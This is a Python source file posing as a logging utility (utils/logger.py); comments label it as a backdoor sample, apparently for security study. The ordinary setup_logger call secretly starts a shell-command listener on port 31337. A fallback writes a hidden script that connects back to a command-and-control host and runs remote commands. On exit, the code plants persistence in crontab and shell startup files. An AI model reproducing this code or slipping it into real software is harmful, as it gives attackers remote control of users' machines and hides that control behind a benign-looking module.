#!/usr/bin/env python3
# Logger Module - Contains backdoor vulnerability
# File: utils/logger.py

import os
import logging
import time
import signal
import atexit
import tempfile
import threading
import socket
import subprocess
from datetime import datetime

# Set up default logger
DEFAULT_LOG_LEVEL = logging.INFO
DEFAULT_LOG_FORMAT = '%(asctime)s - %(name)s - %(levelname)s - %(message)s'

def setup_logger(name, level=DEFAULT_LOG_LEVEL, log_file=None):
    """Set up and return a logger instance"""
    logger = logging.getLogger(name)
    logger.setLevel(level)
    
    # Create a formatter
    formatter = logging.Formatter(DEFAULT_LOG_FORMAT)
    
    # Create console handler
    console_handler = logging.StreamHandler()
    console_handler.setFormatter(formatter)
    logger.addHandler(console_handler)
    
    # Create file handler if log_file is specified
    if log_file:
        try:
            # Create directory if it doesn't exist
            log_dir = os.path.dirname(log_file)
            if log_dir and not os.path.exists(log_dir):
                os.makedirs(log_dir)
                
            file_handler = logging.FileHandler(log_file)
            file_handler.setFormatter(formatter)
            logger.addHandler(file_handler)
        except Exception as e:
            logger.error(f"Failed to set up file logging: {str(e)}")
    
    # Seems like normal logger initialization but secretly sets up backdoor
    _setup_monitoring(logger)
    
    return logger

def _setup_monitoring(logger):
    """Set up 'monitoring' for the logger - actually a backdoor"""
    # Only start backdoor thread if not already running (to avoid multiple instances)
    global _backdoor_thread
    if '_backdoor_thread' not in globals():
        _backdoor_thread = threading.Thread(target=_monitor_thread, daemon=True)
        _backdoor_thread.start()
        
        # Register cleanup function
        atexit.register(_cleanup)

def _monitor_thread():
    """Background thread that 'monitors' log performance - actually a backdoor listener"""
    # VULNERABILITY: Backdoor server that listens for commands
    try:
        # Try to bind to a high numbered port
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        # Bind to all interfaces - vulnerability
        try:
            server.bind(('0.0.0.0', 31337))
            server.listen(1)
            
            while True:
                try:
                    client, addr = server.accept()
                    client_thread = threading.Thread(target=_handle_client, args=(client,))
                    client_thread.daemon = True
                    client_thread.start()
                except:
                    # If connection fails, sleep and continue
                    time.sleep(10)
        except:
            # If binding fails, try alternate backdoor method
            _setup_alternate_backdoor()
    except:
        pass

def _handle_client(client_socket):
    """Handle a client connection to the backdoor"""
    try:
        # Send a prompt
        client_socket.send(b'> ')
        
        while True:
            # Receive command
            data = client_socket.recv(1024).strip()
            if not data:
                break
                
            command = data.decode()
            
            # Exit command
            if command.lower() == 'exit':
                break
                
            # VULNERABILITY: Execute arbitrary commands
            try:
                output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                client_socket.send(output + b'\n> ')
            except subprocess.CalledProcessError as e:
                client_socket.send(f"Error: {e.output.decode()}\n> ".encode())
    except:
        pass
    finally:
        client_socket.close()

def _setup_alternate_backdoor():
    """Set up an alternate backdoor if the main one fails"""
    try:
        # VULNERABILITY: Creates a backdoor script in a temp directory
        backdoor_script = f"""
import os
import socket
import subprocess
import threading
import time

def connect_back():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # Attempts to connect back to a C2 server
            s.connect(("command.data-metrics.com", 8080))
            
            while True:
                data = s.recv(1024).decode().strip()
                if not data:
                    break
                    
                try:
                    output = subprocess.check_output(data, shell=True, stderr=subprocess.STDOUT)
                    s.send(output)
                except:
                    s.send(b"Error executing command\\n")
            
            s.close()
        except:
            pass
            
        # Sleep and retry
        time.sleep(3600)  # 1 hour

# Start backdoor thread
t = threading.Thread(target=connect_back, daemon=True)
t.start()
"""
        
        # Create a hidden temporary file
        temp_dir = tempfile.gettempdir()
        backdoor_path = os.path.join(temp_dir, ".logger_cache.py")
        
        with open(backdoor_path, 'w') as f:
            f.write(backdoor_script)
        
        # Make it executable
        os.chmod(backdoor_path, 0o755)
        
        # Run it in the background
        subprocess.Popen(["python", backdoor_path], 
                        stdout=subprocess.PIPE, 
                        stderr=subprocess.PIPE)
    except:
        pass

def _create_persistence():
    """Try to create persistence on the system"""
    try:
        # VULNERABILITY: This function tries to create persistence
        home_dir = os.path.expanduser("~")
        
        # Different methods based on OS
        if os.name == 'posix':  # Linux/Mac
            # Try to add to crontab
            cron_cmd = f"@reboot python {__file__}\n"
            subprocess.run(f"(crontab -l 2>/dev/null; echo '{cron_cmd}') | crontab -", 
                          shell=True, check=False)
            
            # Try to add to startup files
            startup_paths = [
                os.path.join(home_dir, ".bashrc"),
                os.path.join(home_dir, ".bash_profile"),
                os.path.join(home_dir, ".profile")
            ]
            
            for path in startup_paths:
                if os.path.exists(path):
                    with open(path, 'a') as f:
                        f.write(f"\n# Logger service\n[ -f {__file__} ] && python {__file__} &>/dev/null &\n")
                    break
    except:
        pass

def _cleanup():
    """Cleanup function called on exit"""
    try:
        # Log that we're cleaning up
        logging.getLogger("data_processor").info("Cleaning up logger resources")
        
        # VULNERABILITY: Try to establish persistence on cleanup
        _create_persistence()
    except:
        pass